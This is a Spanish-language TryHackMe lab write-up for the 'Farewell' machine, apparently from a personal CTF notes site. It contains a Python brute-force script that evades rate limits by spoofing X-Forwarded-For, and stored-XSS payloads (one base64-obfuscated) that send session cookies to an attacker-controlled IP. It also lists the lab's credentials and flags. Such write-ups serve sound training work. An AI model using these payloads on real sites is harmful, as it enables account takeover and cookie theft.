---
title: "Farewell"
platform: "TryHackMe"
os: "Linux"
difficulty: "Medium"
ip: "10.67.149.164"
slug: "farewell"
author: "Z4k7"
date: "2026-03-22"
year: "2026"
status: "pwned"
tags:
  - "XSS"
  - "cookie"
  - "WAF"
  - "bruter"
  - "LimitingBypass"
  - "Bypass"
  - "eval"
  - "HttpOnly"
techniques:
  - "XSS"
  - "cookie"
  - "WAF"
  - "bruter"
  - "LimitingBypass"
tools:
  - "Nmap"
  - "Fuff"
  - "Pythonm"
  - "Burpsuite"
flags_list:
  - label: "Usuario"
    value: "deliver11"
  - label: "Password"
    value: "Tokyo1010"
  - label: "Flag"
    value: "THM{USER_ACCESS_1010}"
  - label: "Flag"
    value: "THM{ADMINP@wned007}"
summary: "Descripción del vector de ataque."
steps:

  - id: "exploit"
    num: "01"
    title: "Objetivo"
    content:
      - kind: "note"
        text: |
          El servidor de despedida se desactivará en menos de 24 horas. Se ruega a todos que dejen un último mensaje, pero el panel de administración guarda todos los mensajes. ¿Podrás acceder al área de administración y leer todos los mensajes de despedida antes de que se apaguen?

  - id: "recon"
    num: "02"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Validamos si contamos con conexión a la ip por medio de un `ping`
      - kind: "code"
        lang: "BASH"
        code: |
          ping -c 6 farewell.thm  
          PING farewell.thm (10.67.149.164) 56(84) bytes of data.
          64 bytes from farewell.thm (10.67.149.164): icmp_seq=1 ttl=62 time=74.3 ms
          64 bytes from farewell.thm (10.67.149.164): icmp_seq=2 ttl=62 time=74.8 ms
          64 bytes from farewell.thm (10.67.149.164): icmp_seq=3 ttl=62 time=73.8 ms
          64 bytes from farewell.thm (10.67.149.164): icmp_seq=4 ttl=62 time=88.8 ms
          64 bytes from farewell.thm (10.67.149.164): icmp_seq=5 ttl=62 time=74.5 ms
          64 bytes from farewell.thm (10.67.149.164): icmp_seq=6 ttl=62 time=74.3 ms
          
          --- farewell.thm ping statistics ---
          6 packets transmitted, 6 received, 0% packet loss, time 5013ms
          rtt min/avg/max/mdev = 73.829/76.756/88.776/5.382 ms
      - kind: "note"
        text: |
          Validamos la interfaz de usuario para consultar el entorno
      - kind: "image"
        src: "assets/images/Farewell/file-20260321154526716.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Contamos con un panel de login para acceder a la web en la parte superior derecha contamos con la información que se menciona en el objetivo del laboratorio contamos con un tiempo limitado de 24H para tratar de comprometer el usuario administrador
          iniciamos con un escaneo completo de puertos para identificar servicios expuestos en la máquina objetivo.
      - kind: "code"
        lang: "BASH"
        code: |
          nmap -sVC -O -T4 -v farewell.thm
      - kind: "bullet"
        text: "22 OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)"
      - kind: "bullet"
        text: "80 Apache httpd 2.4.58 ((Ubuntu))"
      - kind: "note"
        text: |
          En  el reporte anterior solo contamos con dos puertos disponibles
      - kind: "code"
        lang: "BASH"
        code: |
          PORT   STATE SERVICE VERSION
          22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
          | ssh-hostkey: 
          |   256 47:60:37:63:05:dc:6a:23:0e:b8:2d:c1:1d:01:df:8c (ECDSA)
          |_  256 e8:61:57:47:16:fc:fa:86:b7:ba:c4:5c:0d:27:7d:a6 (ED25519)
          80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
          | http-methods: 
          |_  Supported Methods: GET HEAD POST OPTIONS
          |_http-server-header: Apache/2.4.58 (Ubuntu)
          | http-cookie-flags: 
          |   /: 
          |     PHPSESSID: 
          |_      httponly flag not set
          |_http-title: Farewell \xE2\x80\x94 Login
          No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
      - kind: "note"
        text: |
          Volviendo en la interfaz de usuario podemos validar en la parte de consola del navegador el apartado de Store contamos con el apartado de #HttpOnly  en estado falso con este reconocimiento podemos tratar de capturar la cookie del  algún usuario que tenga acceso al panel de validación de inicio de sesión en este caso como lógica n o es recomendable tratar de  de aplicar código XSS ya que no contamos con un apartado de inyección del mismo

  - id: "enum"
    num: "03"
    title: "Enumeración"
    content:
      - kind: "note"
        text: |
          Consultamos si de pronto la web cuenta con el archivo de accesos robots.txt el cual nos puede brindar información  adicional
      - kind: "image"
        src: "assets/images/Farewell/file-20260321155458738.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          No contamos con dicha información  lo que podría ser un poco confuso puede ser un tema de protección o configuración parta el acceso a dicha ruta.
          Entramos a validar si el dominio puede contar con directorios o subdominios que nos validar alguna información adicional de lo encontrado esta consulta la podemos realizar por medio de la herramienta `ffuf`.
      - kind: "code"
        lang: "JS"
        code: |
          ffuf -u http://farewell.thm/FUZZ -c  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt:FUZZ -v | grep "| URL |"
          
                  /'___\  /'___\           /'___\       
                 /\ \__/ /\ \__/  __  __  /\ \__/       
                 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
                  \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
                   \ \_\   \ \_\  \ \____/  \ \_\       
                    \/_/    \/_/   \/___/    \/_/       
          
                 v2.1.0-dev
          ________________________________________________
          
           :: Method           : GET
           :: URL              : http://farewell.thm/FUZZ
           :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
           :: Follow redirects : false
           :: Calibration      : false
           :: Timeout          : 10
           :: Threads          : 40
           :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
          ________________________________________________
          
          | URL | http://farewell.thm/javascript
          | URL | http://farewell.thm/server-status
          :: Progress: [26583/26583] :: Job [1/1] :: 507 req/sec :: Duration: [0:00:53] :: Errors: 1 ::
      - kind: "note"
        text: |
          Tratamos de acceder a dichos directores y nos sala en automático el waf es una medida de protección para los directorios puede ser que contenga  información  adicional  relevante para un atacante   podríamos aplicar  una solicitud por medio de un  User-Agent para validar si es posible que el propio waf este ocultando mas directorios  que no son visible ante posibles escaneos esto lo realizamos por medio  de hacernos pasar por un navegador
      - kind: "code"
        lang: "BASH"
        code: |
          ffuf -u http://farewell.thm/FUZZ -c  -w /usr/share/dirb/wordlists/common.txt -v -H "User-Agent: Mozilla/5.0" | grep "| URL |" 
          
                  /'___\  /'___\           /'___\       
                 /\ \__/ /\ \__/  __  __  /\ \__/       
                 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
                  \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
                   \ \_\   \ \_\  \ \____/  \ \_\       
                    \/_/    \/_/   \/___/    \/_/       
          
                 v2.1.0-dev
          ________________________________________________
          
           :: Method           : GET
           :: URL              : http://farewell.thm/FUZZ
           :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
           :: Header           : User-Agent: Mozilla/5.0
           :: Follow redirects : false
           :: Calibration      : false
           :: Timeout          : 10
           :: Threads          : 40
           :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
          ________________________________________________
          
          | URL | http://farewell.thm/.htaccess
          | URL | http://farewell.thm/.hta
          | URL | http://farewell.thm/.htpasswd
          | URL | http://farewell.thm/
          | URL | http://farewell.thm/admin.php
          | URL | http://farewell.thm/index.php
          | URL | http://farewell.thm/info.php
          | URL | http://farewell.thm/javascript
          | URL | http://farewell.thm/server-status
          :: Progress: [4614/4614] :: Job [1/1] :: 501 req/sec :: Duration: [0:00:09] :: Errors: 0 ::
      - kind: "note"
        text: |
          Podemos identificar un directorio que nos llama la atención es la parte de `http://farewell.thm/admin.php`
      - kind: "image"
        src: "assets/images/Farewell/file-20260321161721719.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Tratamos de aplicar un password pero no permite

  - id: "exploit"
    num: "04"
    title: "Explotación"
    content:
      - kind: "note"
        text: |
          Ingresado de nuevo a la interfaz principal de la web en el área de login intentamos pasar  los siguientes dados
      - kind: "image"
        src: "assets/images/Farewell/file-20260321162040880.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          En la  este apartado podemos confirmar que dicho usuario `admin` si  existe en la  como acceso  validando el comportamiento de acceso podemos validar un directorio que realiza el proceso llamado  `check.js`
          Consultando el comportamiento del JS se confirma lo mencionado
      - kind: "code"
        lang: "JS"
        code: |
          if (data && data.error === 'auth_failed') {
                // Show the returned hint if present
                if (data.user && data.user.password_hint) {
                  showHint("Invalid password against the user");
                } else {
                  showAlert('Invalid username or password.');
                }
              } else {
                showAlert('Unexpected response from server.');
                console.warn('Server response:', data);
              }
      - kind: "note"
        text: |
          Valida los datos ingresado en el formulario si el usuario existe en el sistema nos envía un mensaje de confirmación  el usuario existe pero  el password esta erróneo de lo contrario si se accede un usuario que no existe salta el error que dicho usuario no es correcto ,Enviamos la solicitud por medio del proxy para capturar las respuestas por  arte del  servidor en este caso realizamos el proceso por medio de burpsuite.
      - kind: "image"
        src: "assets/images/Farewell/file-20260321162836390.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Al enviar una solicitud y realizar una intersección en la misma podemos evidenciar  el funcionamiento del JS se confirma la logica por  parte del cliente en este caso como el usuario real mente existe nos da como respuesta en JSON con la información del error  dicho erro se comparte o se envía al cliente el cual toma la información y realiza la interacción  para  confirmar la respuesta del servidor
          Validando en el apartado de la respuesta por parte del servidor podemos validar una información relevante como si fuera una pregunta o respuesta para la recuperación del password para recordarla
          `"password_hint":"the year plus a kind send-off"`
          No contamos con la información  relevante para el acceso con dicha información podríamos entrar a validar  mas usuarios  que reconozca   la web en este caso entrando a validar en el web hay aun apartado donde menciona un banner con información relevante de usuario podríamos tratar de validar si dichos usuarios también son reconocidos en la web .
      - kind: "image"
        src: "assets/images/Farewell/file-20260321163406792.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          En el código fuente de la web también podemos visualizar  información tratamos de enviar el acceso   el el mismo usuario y password en el login para validar los errores que envía
      - kind: "code"
        lang: "HTML"
        code: |
          <div class="ticker-wrap" aria-hidden="true">
              <div class="ticker" id="ticker">
                <!-- duplicated items for continuous scroll -->
                <div class="tick-item">adam posted a message - 3 hrs ago</div>
                <div class="tick-item">deliver11 posted a message - 4 hrs ago</div>
                <div class="tick-item">nora posted a message - 1 day ago</div>
              </div>
            </div>
      - kind: "note"
        text: |
          respuestas con los usuarios ingresados
      - kind: "code"
        lang: "JSON"
        code: |
          {"error":"auth_failed",
          	"user":{
          		"name":"adam",
          		"last_password_change":"2025-10-21 09:12:00",
          		"password_hint":"favorite pet + 2"
          		}
          	}
          {
          	"error":"auth_failed",
          	"user":{
          		"name":"deliver11",
          		"last_password_change":"2025-09-10 11:00:00",
          		"password_hint":"Capital of Japan followed by 4 digits"
          		}
          	}
          {
          "error":"auth_failed",
          "user":{
          	"name":"nora",
          	"last_password_change":"2025-08-01 13:45:00",
          	"password_hint":"lucky number 789"
          	}
          }
      - kind: "note"
        text: |
          De las anteriores consulta  el caso mas relevante seria el del usuario  deliver11 ya que dicha información la podemos tomar  en este caso seria Tokyo+4 números
          Al tartar de validar   acceso a la web luego de 10 intentos nos salta el waf bloqueando la conexión
      - kind: "image"
        src: "assets/images/Farewell/file-20260321164210617.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          en este caso para evitar dicho erro podríamos  aplicar en la cabecera de la solicitud lo siguiente `X-Forwarded-For` si enviamos esta cabecera con una ip diferente podemos saltar  la restricción del waf
      - kind: "image"
        src: "assets/images/Farewell/file-20260321164356106.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Para automatizar todo el proceso   y validar  el pasword aplicamos el siguiente script que nos permite enviar  el usuario  y realizar el bypass
      - kind: "code"
        lang: "PYTHON"
        code: |
          #/!bin/python3 
          
          import requests
          
          url = input('[*] Ingrese la url: ')
          try:
              response = requests.get(f'http://{url}/')
          
              if response.status_code == 200:
                  print("[+] Conexión exitosa")  
                  print(f"_____________________")
                  headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
                  }
                  username = input('[*] Ingrese el posible usuario: ')
                  passwor = input('[*] Ingrese el posible password: ')
                  # Generando contraseñas de 4 dígitos (0000-9999)
                  password_list = [str(i).zfill(4) for i in range(10000)]
                  ip = [str(i).zfill(3) for i in range(243)]
                  ip_index = 0 # indice que guarda la ip
                  for password in password_list:
                      data = {"username": username, "password": passwor+password}
                      res = requests.post(f'http://{url}/auth.php',data=data, headers=headers)
          
                      if res.status_code == 200:
                          resjson = res.json()
                          if resjson.get('success'):
                              print(f"[+] Usuario: {username}")
                              print(f"[+] Password: {passwor+password}")                    
                              break                
                          
                          elif resjson.get('error') == "auth_failed":                
                              print(f"[+] Conexion: {res.status_code}")
                              print(f"[+] Usuario: {username}")
                              print(f"[+] Password: {passwor+password}")                
                          else:
                              print(f"[+] Usuario: {username}")
                              print(f"[+] Password: {passwor+password}")
                              break
                      else:
                          print(f"[+] Salto el WAF")
                          print(f"[+] Solicitamos cambio de ip para evitar el WAF")
                          # Usar la ultima ip 
                           while ip_index < len(ip):                
                              cambioip = ip[ip_index] 
                              headers = { 
                                  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                                  "X-Forwarded-For": f"192.168.1.{cambioip}" 
                              }
                              res = requests.post(f'http://{url}/auth.php',data=data, headers=headers)
                              if res.status_code == 200:
                                  print(f"[+] Conexión exitosa con cambio de IP")
                                  ip_index += 1
                              if res.status_code == 200:
                                  resjson = res.json()
                              if resjson.get('success'):
                                  print(f"[+] Usuario: {username}")
                                  print(f"[+] Password: {passwor+password}")
                                  exit()  # salir de todo el script si se valida
                              elif resjson.get('error') == "auth_failed":
                                  break
                              else:
                                  ip_index += 1
              else:
                  print(f"[-] Error con la conexión. Código: {response.status_code}")
          
          except requests.exceptions.RequestException as e:
              print(f"[-] Error al realizar la petición: {e}")
      - kind: "note"
        text: |
          Conexión inicial al servidor
          • 	El script pide una URL y hace una petición  para comprobar si el sitio responde con código  (OK).
          • 	Si la conexión es exitosa, continúa con el proceso de autenticación.
          2. Entrada de credenciales base
          • 	El usuario introduce un nombre de usuario y una contraseña parcial.
          • 	El script usará esa contraseña parcial como prefijo para generar múltiples variantes.
          3. Generación de contraseñas
          • 	Se crea una lista de todas las combinaciones de 4 dígitos ( a ).
          • 	Cada combinación se concatena al prefijo introducido, formando posibles contraseñas completas.
          4. Intentos de autenticación
          • 	Por cada contraseña generada, se envía una petición  al endpoint  con los datos:
          • 	Se analiza la respuesta JSON:
          • 	Si contiene , significa que las credenciales son válidas.
          • 	Si contiene , se indica que la autenticación falló.
          • 	En otros casos, se interpreta como un resultado inesperado.
      - kind: "code"
        lang: "BASH"
        code: |
          {"username": <usuario>, "password": <prefijo+combinación>}
      - kind: "note"
        text: |
          4. Detección de bloqueo (WAF)
          • 	Si el servidor no responde con , el script asume que un WAF (Web Application Firewall) bloqueó la petición.
          • 	Para evadirlo, cambia la cabecera  simulando distintas direcciones IP ().
          • 	Con cada cambio de IP, vuelve a intentar la autenticación.
          5. Finalización
          • 	Si se encuentra una contraseña válida, se imprime el usuario y la contraseña y se detiene el script.
          • 	Si no hay éxito, sigue iterando hasta agotar las combinaciones o las IPs.
      - kind: "code"
        lang: "PYTHON"
        code: |
          python3 sciptfarewell.py
          [*] Ingrese la url: farewell.thm
          [+] Conexión exitosa
          _____________________
          [*] Ingrese el posible usuario: deliver11
          [*] Ingrese el posible password: Tokyo
          +] Solicitamos cambio de ip para evitar el WAF
          [+] Conexión exitosa con cambio de IP
          [+] Conexion: 200
          [+] Usuario: deliver11
          [+] Password: Tokyo1001
          [+] Conexion: 200
          [+] Usuario: deliver11
          [+] Password: Tokyo1002
          [+] Conexion: 200
          [+] Usuario: deliver11
          [+] Password: Tokyo1003
          [+] Conexion: 200
          [+] Usuario: deliver11
          [+] Password: Tokyo1004
          [+] Conexion: 200
          [+] Usuario: deliver11
          [+] Password: Tokyo1005
          [+] Conexion: 200
          [+] Usuario: deliver11
          [+] Password: Tokyo1006
          [+] Conexion: 200
          [+] Usuario: deliver11
          [+] Password: Tokyo1007
          [+] Conexion: 200
          [+] Usuario: deliver11
          [+] Password: Tokyo1008
          [+] Conexion: 200
          [+] Usuario: deliver11
          [+] Password: Tokyo1009
          [+] Salto el WAF
          [+] Solicitamos cambio de ip para evitar el WAF
          [+] Conexión exitosa con cambio de IP
          [+] Usuario: deliver11
          [+] Password: Tokyo1010           <------  PASSWORD
      - kind: "note"
        text: |
          Validamos se completo el escaneo del pasword contamos con la siguiente informacion

  - id: "flag_01"
    type: "flag"
    flag_items:
      - label: "Usuario"
        value: "deliver11"
      - label: "Password"
        value: "Tokyo1010"

  - id: "flag_01_post"
    num: ""
    title: "Post Flag"
    content:
      - kind: "note"
        text: |
          Validamos el acceso a la web
      - kind: "image"
        src: "assets/images/Farewell/file-20260321170618182.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Ya contamos con el acceso y la primera flag.

  - id: "flag_02"
    type: "flag"
    flag_items:
      - label: "Flag"
        value: "THM{USER_ACCESS_1010}"

  - id: "flag_02_post"
    num: ""
    title: "Post Flag"
    content:
      - kind: "note"
        text: |
          Contamos un  apartado como para ingresar datos   en este caso podríamos aplicar un `XSS` Para tratar de  obtener otro usuario
      - kind: "image"
        src: "assets/images/Farewell/file-20260321170851282.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          En esta oportunidad esta pendiente de ser validad podríamos tratar de enviar un xss que nos ayude a capturar la cookie de inicio de algún otro usuario .
          si envió algún script salta  el waf y nos bloquea
      - kind: "image"
        src: "assets/images/Farewell/file-20260321171748670.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          validando el apartado que nos permite ingresar datos es el  `body onload`
          Creamos un servidor por medio del  python
      - kind: "code"
        lang: "PYTHON"
        code: |
          python3 -m http.server 8989
          Serving HTTP on 0.0.0.0 port 8989 (http://0.0.0.0:8989/) ...
      - kind: "note"
        text: |
          Crearemos un script que nos permite extraer la cookie del usuario, El siguiente código nos permite insertar el script en la parte del usuario
      - kind: "code"
        lang: "JS"
        code: |
          <body onload="var a=document.createElement('script');a.src='http://192.168.188.159:8989';document.body.appendChild(a)">
      - kind: "note"
        text: |
          Tratamos de aplicar el anterior código pero por la longitud no lo permite en este caso la alternativa es por medio de `new`
      - kind: "code"
        lang: "JS"
        code: |
          <body onload="new Image().src='http://192.168.188.159:8989?x='+document['coo'+'kie']">
      - kind: "note"
        text: |
          Podemos aplicar también por medio de `eval` y  base64
      - kind: "code"
        lang: "JS"
        code: |
          <body onload="eval(atob('ZmV0Y2goJy8vMTkyLjE2OC4xODguMTU5Ojg5ODkvJytkb2N1bWVudC5jb29raWUp'))">
      - kind: "note"
        text: |
          Con lo anterior capturamos la cookie de inicio de sesión de algún usuario que este administrando la validación de comentarios
      - kind: "image"
        src: "assets/images/Farewell/file-20260321210701247.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Una vez obtenido la cookie pasamos a inyectarla por medio del navegador para validar que usuario nos permite el acceso
      - kind: "image"
        src: "assets/images/Farewell/file-20260321211002835.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Cuando ingresamos se registra la misma interfaz  en este caso tratamos   de ingresar al directorio anterior mente encontrado como `admin.php`
      - kind: "image"
        src: "assets/images/Farewell/file-20260321211149686.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Contamos con la nueva flag

  - id: "flag_03"
    type: "flag"
    flag_items:
      - label: "Flag"
        value: "THM{ADMINP@wned007}"

lessons:
  - "Completar lecciones aprendidas"
mitigation: 'Completar mitigaciones recomendadas.'
---
